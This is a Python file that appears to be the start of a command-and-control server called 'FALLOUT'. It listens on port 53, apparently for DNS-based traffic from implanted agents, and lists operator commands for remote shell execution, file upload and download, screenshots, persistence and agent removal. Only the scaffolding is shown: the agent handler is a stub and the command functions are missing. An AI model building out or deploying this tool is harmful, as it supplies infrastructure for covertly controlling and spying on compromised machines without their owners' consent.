#!/usr/bin/python

# imports
import argparse # for parsing arguments
import os # os commands such as exiting the process
import signal # signal handling
import sys
import threading # self explanitory
import time
import queue # for queueing tasks and the like

from modules import dns, tasker # server modules
from termcolor import colored, cprint # colored terminal output

# variables
PROMPT = 'FALLOUT:> ' # Console Prompt

host = '' # The IP
port = 53 # The Port

q = queue.Queue() # Set up the queue
SocketThread = [] # Threads per socket connection
Agents = {} # array for agents

# Commands for the console
COMMANDS = {
    'help':['Shows The help menu'],
    'exec':['Executes shell commands. Use this sparingly on windows!'],
    'upload':['Uploads a file to the server'],
    'download':['Downloads a file. Requires a url'],
    'screenshot':['Takes a screenshot of the display. This uses API calls in windows.'],
    'persist':['Select a persistence method for the host.'],
    'clean':['Uninstalls the agent'],
    'kill':['Kills the agent'],
    'exit':['Exits the server console, or if interacting with an agent, goes back to the main console'],
    'select':['Interact with a specific agent'],
    'back':['Goes back to the main console'],
    'ls':['Lists what is in the current directory'],
    'pwd':['Displays the current working directory'],
    'hostname':['Prints the hostname'],
    'getuser':['Shows what user the agent is running as'],    
}

# Check for root
if os.geteuid() != 0:
    cprint("\n[!] Needs to be ran as root! Exiting...", "red")
    sys.exit()

# classes

class Handler(threading.Thread):
    # Handles the agent connections
    def __init__(self, agent, agent_address, qnum):
        threading.Thread.__init__(self)
        self.agent = agent
        self.agent_address = agent_address
        self.ip = agent_address[0]
        self.port = agent_address[1]
        self.q = qnum

    def Run(self):
        # Runs the process
        AgentName = threading.current_thread().getName()
        cprint(("\n[+] Agent " + self.ip + ":" + str(self.port) + " connected with Thread_ID: ", AgentName), "green")
        Agents[AgentName] = self.agent_address





# defs
